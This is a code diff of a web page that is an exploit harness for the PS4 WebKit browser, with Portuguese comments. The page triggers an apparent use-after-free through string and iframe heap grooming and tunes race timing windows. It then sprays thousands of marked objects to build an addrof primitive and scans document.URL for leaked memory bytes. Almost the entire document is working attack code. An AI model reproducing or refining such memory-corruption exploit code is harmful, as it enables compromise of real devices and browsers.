@@ -3,11 +3,20 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Full Exploit Suite2</title>
-
+<title>PS4 WebKit – Addrof & Memory Race</title>
+<style>
+    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
+    button { 
+        font-size:14px; padding:12px; margin:5px; 
+        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 280px; text-align: left;
+    }
+    button:hover { background:#0f0; color:#000; }
+    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; padding-top: 10px; }
+    .status { color: #fff; font-weight: bold; }
+</style>
 </head>
 <body>
-<h2>PS4 WebKit – Exploit Analysis & Addrof</h2>
+<h2>PS4 WebKit – Addrof & Memory Race</h2>
 <p>Status: <span id="status" class="status">Ready</span></p>
 
 <button onclick="runStepA()">1. FINGERPRINT CHECK</button><br>
@@ -24,11 +33,10 @@ const statusEl = document.getElementById("status");
 function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// Mantém objetos vivos na memória para o GC não coletar
 window.keepAlive = [];
 
-// --- TRIGGER ESTÁVEL (SUA FASE 1 E 2) ---
-async function triggerBaseUAF() {
+// --- TRIGGER COM SLEEP AJUSTADO PARA VENCER A URL ---
+async function triggerBaseUAF(fastMode = false) {
     logEl.textContent = "";
     window.keepAlive = [];
     statusEl.textContent = "Running UAF Phase...";
@@ -37,7 +45,6 @@ async function triggerBaseUAF() {
     let size = 977;
     const STEP = 14461;
 
-    // Fase 1 – Original Fingerprinted Trigger
     for(let i=0; i<48; i++){
         let char = String.fromCharCode(0x41 + (i % 26));
         let frag = char.repeat(size); 
@@ -50,10 +57,13 @@ async function triggerBaseUAF() {
         await sleep(5);
     }
 
-    log(">>> UAF WINDOW OPEN (Waiting 120ms) <<<");
-    await sleep(0);
+    // AJUSTE: Redução drástica para vencer a escrita da URL na memória
+    let waitWindow = fastMode ? 40 : 120;
+    let waitGroom = fastMode ? 20 : 80;
 
-    // Fase 2 – Original Grooming (Iframes)
+    log(">>> UAF WINDOW: " + waitWindow + "ms <<<");
+    await sleep(waitWindow);
+
     let frames = [];
     for(let i=0; i<80; i++){
         let f = document.createElement("iframe");
@@ -69,91 +79,57 @@ async function triggerBaseUAF() {
     frames.forEach(f=>f.remove());
     frames = null;
 
-    await sleep(80);
+    log(">>> GROOMING WINDOW: " + waitGroom + "ms <<<");
+    await sleep(waitGroom);
 }
 
-// --- PASSO A: FINGERPRINTING ---
-async function runStepA() {
-    await triggerBaseUAF();
-    log("\n[STEP A] Fingerprint Check...");
-    let url = document.URL;
-    let found = false;
-    for(let i=0; i<26; i++) {
-        let pattern = String.fromCharCode(0x41 + i).repeat(10);
-        if(url.includes(pattern)) {
-            log("FOUND PATTERN: " + pattern.substring(0,4) + "... Offset: " + url.indexOf(pattern));
-            found = true;
-        }
-    }
-    if(!found) log("No patterns. Memory is dirty or zeroed.");
-    statusEl.textContent = "Analysis Complete";
-}
+async function runStepA() { await triggerBaseUAF(false); log("\n[A] Fingerprint..."); let url = document.URL; for(let i=0; i<26; i++){ let p = String.fromCharCode(0x41+i).repeat(10); if(url.includes(p)) log("FOUND: " + p.substring(0,4) + " at " + url.indexOf(p)); } }
 
-// --- PASSO B: WINDOWED READ (HEX PROBE) ---
-async function runStepB() {
-    await triggerBaseUAF();
-    log("\n[STEP B] Hex Probing (Length: " + document.URL.length + ")...");
-    let url = document.URL;
-    const offsets = [0, 34, 1000, 5000, 10000, 50000, 100000, 200000, 300000];
-    offsets.forEach(off => {
-        if(off < url.length) {
-            let code = url.charCodeAt(off);
-            log("Offset [" + off + "]: 0x" + code.toString(16).toUpperCase().padStart(2, '0') + " (" + (code > 31 && code < 127 ? String.fromCharCode(code) : "?") + ")");
-        }
-    });
-    statusEl.textContent = "Analysis Complete";
-}
+async function runStepB() { await triggerBaseUAF(false); log("\n[B] Hex Probe..."); let url = document.URL; [0, 34, 1000, 50000].forEach(off => { if(off < url.length) log("["+off+"]: 0x"+url.charCodeAt(off).toString(16).toUpperCase()); }); }
 
-// --- PASSO C: LAYOUT LOGIC ---
-async function runStepC() {
-    await triggerBaseUAF();
-    log("\n[STEP C] Checking Sync...");
-    let oldLen = document.URL.length;
-    location.hash = "#TEST_SYNC";
-    await sleep(20);
-    log("Old: " + oldLen + " | New: " + document.URL.length);
-    log(document.URL.length !== oldLen ? "Length Consistent" : "CRITICAL: UAF LENGTH SYNC ERROR");
-    statusEl.textContent = "Analysis Complete";
-}
+async function runStepC() { await triggerBaseUAF(false); let old = document.URL.length; location.hash = "#TEST"; await sleep(20); log("Sync Check: " + old + " -> " + document.URL.length); }
 
-// --- PASSO D: OBJECT ALIGNMENT (O NOVO SPRAY) ---
+// --- PASSO D: O SPRAY AGRESSIVO PARA ADDROF ---
 async function runStepD() {
-    await triggerBaseUAF();
-    log("\n[STEP D] Target: Butterfly Alignment (addrof)...");
+    // Usamos o modo rápido (FastMode) para tentar interceptar a memória
+    await triggerBaseUAF(true); 
     
-    statusEl.textContent = "Spraying Objects...";
-    // Criando objetos com muitas propriedades (Butterflies)
-    // Elas são alocadas em regiões similares a buffers de strings
-    let spray = [];
-for(let i = 0; i < 5000; i++) {
-    // Criamos um objeto com um padrão de bits que NÃO parece texto
-    let obj = { a: 0x41424344, b: 0x1337BEEF }; 
-    // Forçamos a criação de uma Butterfly grande
-    obj.p1 = 1.1; obj.p2 = 2.2; obj.p3 = 3.3;
-    spray.push(obj);
-}
-// Spray de strings para "empurrar" a memória
-for(let i = 0; i < 500; i++) {
-    spray.push(new String("DUMMY_PADDING_STRING_" + i));
-}
-    window.keepAlive = spray; // Evita GC
-    await sleep(150);
+    log("\n[STEP D] High-Speed Object Spray...");
+    statusEl.textContent = "Spraying 8000 Objects...";
 
+    let spray = [];
+    for(let i = 0; i < 8000; i++) {
+        // Criamos objetos com "Butterflies" grandes (propriedades nomeadas)
+        let obj = { 
+            marker: 0x41424344, 
+            id: i,
+            leak: 0x1337BEEF 
+        };
+        // Adicionamos propriedades para forçar a alocação fora da estrutura básica
+        for(let j = 0; j < 32; j++) {
+            obj["prop" + j] = 0x1337BEEF;
+        }
+        spray.push(obj);
+    }
+    window.keepAlive = spray;
+
+    // SEM SLEEP aqui: Leitura imediata para tentar "pegar" o spray
     let url = document.URL;
-    log("Scanning for Property Values (0x1337beef)...");
+    log("Scanning offsets for 0xEF (byte de 0x1337BEEF)...");
     
     let found = false;
-    // Varre a área onde o Fingerprint 'V' costuma aparecer
-    for(let off = 0; off < 1000; off++) {
+    // Varremos os primeiros 2000 bytes onde a URL costuma aparecer
+    for(let off = 0; off < 2000; off++) {
         let code = url.charCodeAt(off);
-        // Procuramos pelo byte final de 0x1337BEEF (0xEF ou 239)
-        if(code !== 0x56 && code !== 0 && code !== 0x68) {
-            log("LEAK at [" + off + "]: 0x" + code.toString(16).toUpperCase());
+        
+        // Se encontrarmos o byte 0xEF (239) ou algo que não seja 'h', 't', 'p', 's', ':' ou '/'
+        if(code !== 0 && code !== 0x56 && ![0x68, 0x74, 0x70, 0x73, 0x3A, 0x2F].includes(code)) {
+            log("DATA FOUND at [" + off + "]: 0x" + code.toString(16).toUpperCase());
             found = true;
         }
     }
     
-    if(!found) log("Nothing found. Buffer still contains old strings.");
+    if(!found) log("Result: Memory still occupied by URL string. Try again.");
     statusEl.textContent = "Analysis Complete";
 }
 </script>
